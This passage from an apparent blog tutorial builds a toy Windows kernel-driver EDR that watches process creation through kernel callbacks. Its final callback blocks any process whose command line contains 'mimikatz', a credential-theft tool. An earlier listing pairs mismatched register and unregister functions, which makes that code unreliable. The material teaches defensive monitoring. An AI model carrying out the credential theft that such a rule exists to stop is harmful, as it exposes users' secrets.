</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    LONG (<span style="color:#f92672">*</span>MajorFunction[<span style="color:#ae81ff">28</span>])(<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_DEVICE_OBJECT</span><span style="color:#f92672">*</span> arg1, <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_IRP</span><span style="color:#f92672">*</span> arg2);     <span style="color:#75715e">//0x70
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}; 
</span></span></code></pre></div><ul>
<li>RegistryPath: a pointer to a unicode string containing the path to the driver’s parameters key which is usually located under the following registry key:</li>
</ul>
<pre tabindex="0"><code>HKLM:\SYSTEM\CurrentControlSet\Service
</code></pre><p>If we take a look at content of the DriverEntry’s function, we can see that, apart from the DbgPrintEx functions used to print messages in dbgview, two functions are called:</p>
<ul>
<li>IoCreateDevice: used to create a device object representing our driver</li>
<li>IoCreateSymbolicLink: used to create the symbolic link that we will use to contact our driver</li>
</ul>
<p>These functions are the mandatory one that we need to specify in order to load a driver on the system.</p>
<p>The second important line specifies a routine to run when the driver is unloaded:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span>DriverObject<span style="color:#f92672">-&gt;</span>DriverUnload <span style="color:#f92672">=</span> UnloadMyDumbEDR;
</span></span></code></pre></div><p>In our code, the routine is the following function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">UnloadMyDumbEDR</span>(_In_ PDRIVER_OBJECT DriverObject) {
</span></span><span style="display:flex;"><span>    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span style="color:#e6db74">"MyDumbEDR: Unloading routine called</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Delete the driver device 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    IoDeleteDevice(DriverObject<span style="color:#f92672">-&gt;</span>DeviceObject);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Delete the symbolic link
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    IoDeleteSymbolicLink(<span style="color:#f92672">&amp;</span>SYM_LINK);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>As you can see this is the exact opposite of the loading routine, it deletes the device as well as the symbolic link. And that’s it, at this point we have got a working kernel driver. It does nothing yet but it runs so let’s implement one of the first mechanism used by EDR’s to monitore the system: callback objects!</p>
<h1 id="vi-implementing-function-callback">VI/ Implementing function callback</h1>
<p>As we have seen before, function callbacks are functions that can be used by a driver to register what is called a kernel callback. The underlying idea of a kenel callback is that, each time a particular action is done on the system, the kernel will inform the driver that registered the callback, that an action is being performed.</p>
<p>To register such kernel callback, you can user a function callback that will allow you monitoring specific events. The most known function callback are:</p>
<ul>
<li>PsSetCreateProcessNotifyRoutine: used to monitor process creation</li>
<li>PsSetLoadImageNotifyRoutine: used to monitor DLL loading</li>
<li>PsSetThreadCreateNotifyRoutine: used to monitor thread creation</li>
<li>ObRegisterCallbacks: used to monitor calls to the OpenProcess, OpenThread and OpenDesktop functions</li>
<li>CmRegisterCallbacks: used to monitor the creation, modification and deletion of a registry key.</li>
<li>IoRegisterShutdown: monitor the shutdown of the computer​</li>
<li>IoRegisterFsRegistrationChange : monitor the modification of a file</li>
</ul>
<p>Below you will find a schema that sums up the process of registering a function callback in order to monitore for process creation:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/kernelcallback.png" alt="CreateFile on driver"></p>
<p>As you can see, being aware of a process being created is a very important information. For that reason, each and every EDR’s driver register kernel callbacks in order to monitore process creation via the PsSetCreateProcessNotifyRoutine function. It’s prototype is the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>NTSTATUS <span style="color:#a6e22e">PsSetCreateProcessNotifyRoutine</span>(
</span></span><span style="display:flex;"><span>    PCREATE_PROCESS_NOTIFY_ROUTINE NotifyRoutine, <span style="color:#75715e">// Pointer to the function to execute when a process is created
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    BOOLEAN                        Remove         <span style="color:#75715e">// Whether the routine specified by NotifyRoutine should be added to or removed from the system's list of notification routines
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>);
</span></span></code></pre></div><p>Pretty simple right ? The first argument is a pointer to a routine that is going to be executed each time the driver receives a notification from the kernel while the second one specifies whether or not the callback should be registered or unregistered. In the following code, this routine is the CreateProcessNotifyRoutine function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Ntifs.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ntddk.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;wdf.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Global variables
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>UNICODE_STRING DEVICE_NAME <span style="color:#f92672">=</span> RTL_CONSTANT_STRING(<span style="color:#e6db74">L</span><span style="color:#e6db74">"</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Device</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">MyDumbEDR"</span>); <span style="color:#75715e">// Internal device name
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>UNICODE_STRING SYM_LINK <span style="color:#f92672">=</span> RTL_CONSTANT_STRING(<span style="color:#e6db74">L</span><span style="color:#e6db74">"</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">??</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">MyDumbEDR"</span>);        <span style="color:#75715e">// Symlink
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// handle incoming notifications about new/terminated processes
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">CreateProcessNotifyRoutine</span>(HANDLE ppid, HANDLE pid, BOOLEAN create){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (create){
</span></span><span style="display:flex;"><span>        PEPROCESS process <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>        PUNICODE_STRING processName <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Retrieve process ID
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        PsLookupProcessByProcessId(pid, <span style="color:#f92672">&amp;</span>process);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Retrieve the process name from the EPROCESS structure
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        SeLocateProcessImageName(process, <span style="color:#f92672">&amp;</span>processName);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span style="color:#e6db74">"MyDumbEDR: %d (%wZ) launched.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, pid, processName);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span style="color:#e6db74">"MyDumbEDR: %d got killed.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, pid);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">UnloadMyDumbEDR</span>(_In_ PDRIVER_OBJECT DriverObject) {
</span></span><span style="display:flex;"><span>    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span style="color:#e6db74">"MyDumbEDR: Unloading routine called</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Unset the callback
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    PsSetCreateProcessNotifyRoutineEx(CreateProcessNotifyRoutine, TRUE);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Delete the driver device 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    IoDeleteDevice(DriverObject<span style="color:#f92672">-&gt;</span>DeviceObject);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Delete the symbolic link
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    IoDeleteSymbolicLink(<span style="color:#f92672">&amp;</span>SYM_LINK);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NTSTATUS <span style="color:#a6e22e">DriverEntry</span>(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath){
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Prevent compiler error in level 4 warnings
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    UNREFERENCED_PARAMETER(RegistryPath);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span style="color:#e6db74">"MyDumbEDR: Initializing the driver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Variable that will store the output of WinAPI functions
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    NTSTATUS status;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Setting the unload routine to execute
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    DriverObject<span style="color:#f92672">-&gt;</span>DriverUnload <span style="color:#f92672">=</span> UnloadMyDumbEDR;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Initializing a device object and creating it
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    PDEVICE_OBJECT DeviceObject;
</span></span><span style="display:flex;"><span>    UNICODE_STRING deviceName <span style="color:#f92672">=</span> DEVICE_NAME;
</span></span><span style="display:flex;"><span>    UNICODE_STRING symlinkName <span style="color:#f92672">=</span> SYM_LINK;
</span></span><span style="display:flex;"><span>    status <span style="color:#f92672">=</span> IoCreateDevice(
</span></span><span style="display:flex;"><span>        DriverObject,		   <span style="color:#75715e">// our driver object,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0</span>,					   <span style="color:#75715e">// no need for extra bytes,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">&amp;</span>deviceName,           <span style="color:#75715e">// the device name,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        FILE_DEVICE_UNKNOWN,   <span style="color:#75715e">// device type,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0</span>,					   <span style="color:#75715e">// characteristics flags,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        FALSE,				   <span style="color:#75715e">// not exclusive,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">&amp;</span>DeviceObject		   <span style="color:#75715e">// the resulting pointer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>NT_SUCCESS(status)) {
</span></span><span style="display:flex;"><span>        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span style="color:#e6db74">"MyDumbEDR: Device creation failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> status;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Creating the symlink that we will use to contact our driver
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    status <span style="color:#f92672">=</span> IoCreateSymbolicLink(<span style="color:#f92672">&amp;</span>symlinkName, <span style="color:#f92672">&amp;</span>deviceName);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>NT_SUCCESS(status)) {
</span></span><span style="display:flex;"><span>        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span style="color:#e6db74">"MyDumbEDR: Symlink creation failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>        IoDeleteDevice(DeviceObject);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> status;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    PsSetCreateProcessNotifyRoutine(CreateProcessNotifyRoutine, FALSE);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> STATUS_SUCCESS;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Build the driver, launch it, open DbgView and spawn whatever process you want. If everything went correctly you should see debug messages in DbgView printing the PID, as well as the process name of the process being launched or killed:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/dumb_edr_the_beginning.png" alt="Dumb EDR the beginning"></p>
<p>Being aware of a process creation is interesting but we need to develop a logic that is going to allow our EDR to determine whether or not such process should be created. To do we will have to use the extended function of PsSetCreateProcessNotifyRoutine called PsSetCreateProcessNotifyRoutineEx. The prototype for this function is the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>NTSTATUS <span style="color:#a6e22e">PsSetCreateProcessNotifyRoutineEx</span>(
</span></span><span style="display:flex;"><span>    PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine, <span style="color:#75715e">// Pointer to the PCreateProcessNotifyRoutineEx structure
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    BOOLEAN                           Remove         <span style="color:#75715e">// Whether or not we should add or remove the callback
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>);
</span></span></code></pre></div><p>At first the functions PsSetCreateProcessNotifyRoutineEx and PsSetCreateProcessNotifyRoutine look identical but when we take a closer look at the first argument of the PsSetCreateProcessNotifyRoutineEx we can see that the structure is a little bit more developped:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>PCREATE_PROCESS_NOTIFY_ROUTINE PcreateProcessNotifyRoutine;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> PcreateProcessNotifyRoutineEx(
</span></span><span style="display:flex;"><span>    PEPROCESS Process,                  <span style="color:#75715e">// Pointer to the EPROCESS structure
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    HANDLE ProcessId,                   <span style="color:#75715e">// Process PID
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    PPS_CREATE_NOTIFY_INFO CreateInfo   <span style="color:#75715e">// Process structure containing information about the process being launched
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>)
</span></span></code></pre></div><p>The third variable contains information about the process being launched such as its command line, its parent PID, its image filename and so on:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_PS_CREATE_NOTIFY_INFO</span> {
</span></span><span style="display:flex;"><span>    SIZE_T              Size;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">union</span> {
</span></span><span style="display:flex;"><span>        ULONG Flags;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>            ULONG FileOpenNameAvailable : <span style="color:#ae81ff">1</span>;  <span style="color:#75715e">//
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            ULONG IsSubsystemProcess : <span style="color:#ae81ff">1</span>;     
</span></span><span style="display:flex;"><span>            ULONG Reserved : <span style="color:#ae81ff">30</span>;
</span></span><span style="display:flex;"><span>        };
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>    HANDLE              ParentProcessId;     <span style="color:#75715e">// Parent PID
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    CLIENT_ID           CreatingThreadId;    <span style="color:#75715e">// Thread id 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_FILE_OBJECT</span> <span style="color:#f92672">*</span>FileObject; 
</span></span><span style="display:flex;"><span>    PCUNICODE_STRING    ImageFileName;       <span style="color:#75715e">// Name of the binary
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    PCUNICODE_STRING    CommandLine;         <span style="color:#75715e">// Arguments passed to the binary
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    NTSTATUS            CreationStatus;      <span style="color:#75715e">// This variable holds whether or not the process should be created
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>} PS_CREATE_NOTIFY_INFO, <span style="color:#f92672">*</span>PPS_CREATE_NOTIFY_INFO;
</span></span></code></pre></div><p>What’s interesting here is the CreationStatus variable which is where the driver will store its decision: if it allows or denies the process creation. This variable can contain two values:</p>
<ul>
<li>STATUS_SUCCESS: the driver informs the kernel that the process can be launched</li>
<li>STATUS_ACCESS_DENIED: the driver informs the kernel that the process can not be launched</li>
</ul>
<p>Here is the final implementation of the kernel callback mechanism on our dumb EDR:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Ntifs.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ntddk.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;wdf.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Global variables
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>UNICODE_STRING DEVICE_NAME <span style="color:#f92672">=</span> RTL_CONSTANT_STRING(<span style="color:#e6db74">L</span><span style="color:#e6db74">"</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Device</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">MyDumbEDR"</span>); <span style="color:#75715e">// Internal device name
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>UNICODE_STRING SYM_LINK <span style="color:#f92672">=</span> RTL_CONSTANT_STRING(<span style="color:#e6db74">L</span><span style="color:#e6db74">"</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">??</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">MyDumbEDR"</span>);        <span style="color:#75715e">// Symlink
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Handle incoming notifications about new/terminated processes
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">CreateProcessNotifyRoutine</span>(PEPROCESS process, HANDLE pid, PPS_CREATE_NOTIFY_INFO createInfo) {
</span></span><span style="display:flex;"><span>    UNREFERENCED_PARAMETER(process);
</span></span><span style="display:flex;"><span>    UNREFERENCED_PARAMETER(pid);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Never forget this if check because if you don't, you'll end up crashing your Windows system ;P
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (createInfo <span style="color:#f92672">!=</span> NULL) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Compare the command line of the launched process to the notepad string
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (wcsstr(createInfo<span style="color:#f92672">-&gt;</span>CommandLine<span style="color:#f92672">-&gt;</span>Buffer, <span style="color:#e6db74">L</span><span style="color:#e6db74">"notepad"</span>) <span style="color:#f92672">!=</span> NULL){
</span></span><span style="display:flex;"><span>            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span style="color:#e6db74">"MyDumbEDR: Process (%ws) allowed.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, createInfo<span style="color:#f92672">-&gt;</span>CommandLine<span style="color:#f92672">-&gt;</span>Buffer);
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Process allowed
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            createInfo<span style="color:#f92672">-&gt;</span>CreationStatus <span style="color:#f92672">=</span> STATUS_SUCCESS;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Compare the command line of the launched process to the mimikatz string
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (wcsstr(createInfo<span style="color:#f92672">-&gt;</span>CommandLine<span style="color:#f92672">-&gt;</span>Buffer, <span style="color:#e6db74">L</span><span style="color:#e6db74">"mimikatz"</span>) <span style="color:#f92672">!=</span> NULL) {
</span></span><span style="display:flex;"><span>            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span style="color:#e6db74">"MyDumbEDR: Process (%ws) denied.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, createInfo<span style="color:#f92672">-&gt;</span>CommandLine<span style="color:#f92672">-&gt;</span>Buffer);
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Process denied
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            createInfo<span style="color:#f92672">-&gt;</span>CreationStatus <span style="color:#f92672">=</span> STATUS_ACCESS_DENIED;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">UnloadMyDumbEDR</span>(_In_ PDRIVER_OBJECT DriverObject) {
</span></span><span style="display:flex;"><span>    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span style="color:#e6db74">"MyDumbEDR: Unloading routine called</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Unset the callback
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    PsSetCreateProcessNotifyRoutineEx(CreateProcessNotifyRoutine, TRUE);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Delete the driver device 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    IoDeleteDevice(DriverObject<span style="color:#f92672">-&gt;</span>DeviceObject);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Delete the symbolic link
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    IoDeleteSymbolicLink(<span style="color:#f92672">&amp;</span>SYM_LINK);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NTSTATUS <span style="color:#a6e22e">DriverEntry</span>(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Prevent compiler error in level 4 warnings
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    UNREFERENCED_PARAMETER(RegistryPath);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span style="color:#e6db74">"MyDumbEDR: Initializing the driver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Variable that will store the output of WinAPI functions
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    NTSTATUS status;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Setting the unload routine to execute
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    DriverObject<span style="color:#f92672">-&gt;</span>DriverUnload <span style="color:#f92672">=</span> UnloadMyDumbEDR;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Initializing a device object and creating it
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    PDEVICE_OBJECT DeviceObject;
</span></span><span style="display:flex;"><span>    UNICODE_STRING deviceName <span style="color:#f92672">=</span> DEVICE_NAME;
</span></span><span style="display:flex;"><span>    UNICODE_STRING symlinkName <span style="color:#f92672">=</span> SYM_LINK;
</span></span><span style="display:flex;"><span>    status <span style="color:#f92672">=</span> IoCreateDevice(
</span></span><span style="display:flex;"><span>        DriverObject,		   <span style="color:#75715e">// our driver object,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0</span>,					   <span style="color:#75715e">// no need for extra bytes,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">&amp;</span>deviceName,           <span style="color:#75715e">// the device name,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        FILE_DEVICE_UNKNOWN,   <span style="color:#75715e">// device type,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0</span>,					   <span style="color:#75715e">// characteristics flags,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        FALSE,				   <span style="color:#75715e">// not exclusive,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">&amp;</span>DeviceObject		   <span style="color:#75715e">// the resulting pointer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>NT_SUCCESS(status)) {
</span></span><span style="display:flex;"><span>        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span style="color:#e6db74">"MyDumbEDR: Device creation failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> status;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Creating the symlink that we will use to contact our driver
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    status <span style="color:#f92672">=</span> IoCreateSymbolicLink(<span style="color:#f92672">&amp;</span>symlinkName, <span style="color:#f92672">&amp;</span>deviceName);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>NT_SUCCESS(status)) {
</span></span><span style="display:flex;"><span>        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span style="color:#e6db74">"MyDumbEDR: Symlink creation failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>        IoDeleteDevice(DeviceObject);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> status;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Registers the kernel callback
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    PsSetCreateProcessNotifyRoutineEx(CreateProcessNotifyRoutine, FALSE);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span style="color:#e6db74">"MyDumbEDR: Driver created</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> STATUS_SUCCESS;
